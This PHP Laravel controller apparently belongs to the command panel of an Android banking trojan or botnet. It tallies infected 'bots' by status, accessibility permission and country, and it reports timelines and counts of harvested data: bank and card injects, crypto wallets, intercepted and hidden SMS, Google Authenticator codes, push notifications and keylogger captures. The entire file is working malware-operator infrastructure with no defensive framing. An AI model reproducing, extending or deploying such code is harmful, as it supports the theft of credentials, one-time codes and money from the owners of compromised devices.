<?php

namespace App\Http\Controllers;

use App\Helpers\ApiResponse;
use App\Http\Resources\BotLog\BotLogCollection;
use App\Http\Response\AccessDeniedResponse;
use App\Models\Bot;
use App\Models\BotLog;
use App\Models\UserBotTimestamp;
use Carbon\Carbon;
use Illuminate\Http\JsonResponse;
use Illuminate\Http\Request;
use Illuminate\Support\Collection;
use Illuminate\Support\Facades\DB;

class StatsController extends Controller
{
    public function list(Request $request): ApiResponse
    {
        $user = auth()->user();

        if (!$user) {
            return ApiResponse::error();
        }

        $bots = Bot::when(count($user->tags), function ($query) use ($user) {
            return $query->whereIn('tag', $user->tagsNames);
        });

        $botsTotal = (clone $bots)->count();

        $botsTotalToday = (clone $bots)->whereDate('created_at', Carbon::today())->count();

        $botsOnline = (clone $bots)->whereRaw('updated_at >= DATE_SUB(NOW() , INTERVAL 1 MINUTE)')
            ->whereRaw('JSON_EXTRACT(permissions, "$.accessibility") = "true"')
            ->count();

        $botsOffline = (clone $bots)->whereRaw('updated_at >= DATE_SUB(NOW() , INTERVAL 2400 MINUTE)')
            ->whereRaw('JSON_EXTRACT(permissions, "$.accessibility") = "true"')
            ->whereRaw('updated_at < DATE_SUB(NOW() , INTERVAL 1 MINUTE)')
            ->count();

        $botsDead = (clone $bots)->whereRaw('updated_at <= DATE_SUB(NOW() , INTERVAL 2400 MINUTE)')->count();

        $botsWithPermissions = (clone $bots)->whereRaw('JSON_EXTRACT(permissions, "$.accessibility") = "true"')->count();

        $botsPermissionless = (clone $bots)->whereRaw('JSON_EXTRACT(permissions, "$.accessibility") = "false"')->count();

        $botLogsTimelinesQuery = DB::table('bot_logs')
            ->selectRaw("date_format(bot_logs.created_at, '%Y-%m-%d') as date, COUNT(*) as count, type as category")
            ->groupByRaw("YEAR(bot_logs.created_at), MONTH(bot_logs.created_at), DAY(bot_logs.created_at)")
            ->join('bots', 'bot_logs.bot_id', '=', 'bots.id')
            ->when(count($user->tags), function ($query) use ($user) {
                return $query->whereIn('bots.tag', $user->tagsNames);
            });

        $botsCountries = (clone $bots)
            ->selectRaw('COUNT(*) as count, country_code')
            ->groupBy('country_code')
            ->orderByDesc('count')
            ->get()
            ->map(function (Bot $bot) use ($botsTotal) {
                return [
                    'count' => $bot->count,
                    'percent' => round($bot->count / $botsTotal * 100),
                    'country_code' => $bot->country_code,
                    'country' => config('countries')[strtoupper($bot->country_code)] ?? "RU",
                ];
            });

        $banksTimelines = (clone $botLogsTimelinesQuery)
            ->where('type', '=', 'banks')
            ->get()
            ->toArray();

        $creditCardsTimelines = (clone $botLogsTimelinesQuery)
            ->where('type', '=', 'credit_cards')
            ->get()
            ->toArray();

        $stealersTimelines = (clone $botLogsTimelinesQuery)
            ->where('type', '=', 'stealers')
            ->get()
            ->toArray();

        $cryptTimelines = (clone $botLogsTimelinesQuery)
            ->where('type', '=', 'crypt')
            ->get()
            ->toArray();

        $shopsTimelines = (clone $botLogsTimelinesQuery)
            ->where('type', '=', 'shops')
            ->get()
            ->toArray();

        $emailsTimelines = (clone $botLogsTimelinesQuery)
            ->where('type', '=', 'emails')
            ->get()
            ->toArray();

        $walletsTimelines = (clone $botLogsTimelinesQuery)
            ->where('type', '=', 'wallets')
            ->get()
            ->toArray();

        $injectTimelines = array_merge(
            $banksTimelines,
            $creditCardsTimelines,
            $stealersTimelines,
            $cryptTimelines,
            $shopsTimelines,
            $emailsTimelines,
            $walletsTimelines
        );

        $smsListTimelines = (clone $botLogsTimelinesQuery)
            ->where('type', '=', 'smslist')
            ->get()
            ->toArray();

        $hideSMSListTimelines = (clone $botLogsTimelinesQuery)
            ->where('type', '=', 'hidesms')
            ->get()
            ->toArray();

        $googleAuthTimelines = (clone $botLogsTimelinesQuery)
            ->where('type', '=', 'googleauth')
            ->get()
            ->toArray();

        $otherAccountsTimelines = (clone $botLogsTimelinesQuery)
            ->where('type', '=', 'otheraccounts')
            ->get()
            ->toArray();

        $pushListTimelines = (clone $botLogsTimelinesQuery)
            ->where('type', '=', 'pushlist')
            ->get()
            ->toArray();

        $dataKeyloggerTimelines = (clone $botLogsTimelinesQuery)
            ->where('type', '=', 'datakeylogger')
            ->get()
            ->toArray();

        $timelines = array_merge(
            $smsListTimelines,
            $hideSMSListTimelines,
            $googleAuthTimelines,
            $otherAccountsTimelines,
            $pushListTimelines,
            $dataKeyloggerTimelines,
        );

        $botLogs = BotLog::join('bots', 'bot_logs.bot_id', '=', 'bots.id')
            ->when(count($user->tags), function ($query) use ($user) {
                return $query->whereIn('bots.tag', $user->tagsNames);
            });

        $banksLogs = (clone $botLogs)->where('type', 'banks')->count();

        $creditCardsLogs = (clone $botLogs)->where('type', 'credit_cards')->count();

        $stealersLogs = (clone $botLogs)->where('type', 'stealers')->count();

        $cryptLogs = (clone $botLogs)->where('type', 'crypt')->count();

        $shopsLogs = (clone $botLogs)->where('type', 'shops')->count();

        $emailsLogs = (clone $botLogs)->where('type', 'emails')->count();

        $walletsLogs = (clone $botLogs)->where('type', 'wallets')->count();

        $smsListLogs = (clone $botLogs)->where('type', 'smslist')->count();

        $hideSMSListLogs = (clone $botLogs)->where('type', 'hidesms')->count();

        $googleAuthLogs = (clone $botLogs)->where('type', 'googleauth')->count();

        $otherAccountsLogs = (clone $botLogs)->where('type', 'otheraccounts')->count();

        $pushListLogs = (clone $botLogs)->where('type', 'pushlist')->count();

        $dataKeyloggerLogs = (clone $botLogs)->where('type', 'datakeylogger')->count();

        return ApiResponse::success([
            'bots' => [
                'counts' => [
                    'total' => $botsTotal,
                    'totalToday' => $botsTotalToday,
                    'online' => $botsOnline,
                    'offline' => $botsOffline,
                    'dead' => $botsDead,
                    'withPermissions' => $botsWithPermissions,
                    'permissionless' => $botsPermissionless,
                ],
                'countries' => $botsCountries,
            ],
            'injects' => [
                'timelines' => $injectTimelines,
                'counts' => [
                    'banks' => $banksLogs,
                    'credit_cards' => $creditCardsLogs,
                    'stealers' => $stealersLogs,
                    'crypt' => $cryptLogs,
                    'shops' => $shopsLogs,
                    'emails' => $emailsLogs,
                    'wallets' => $walletsLogs,
                    'sum' => $banksLogs + $creditCardsLogs + $stealersLogs + $cryptLogs + $shopsLogs + $emailsLogs + $walletsLogs,
                ],
            ],
            'logs' => [
                'timelines' => $timelines,
                'counts' => [
                    'smslist' => $smsListLogs,
                    'hidesms' => $hideSMSListLogs,
                    'googleauth' => $googleAuthLogs,
                    'otheraccounts' => $otherAccountsLogs,
                    'pushlist' => $pushListLogs,
                    'datakeylogger' => $dataKeyloggerLogs,
                    'sum' => $smsListLogs + $hideSMSListLogs + $googleAuthLogs + $otherAccountsLogs + $pushListLogs + $dataKeyloggerLogs,
                ]
            ],
        ]);
    }
}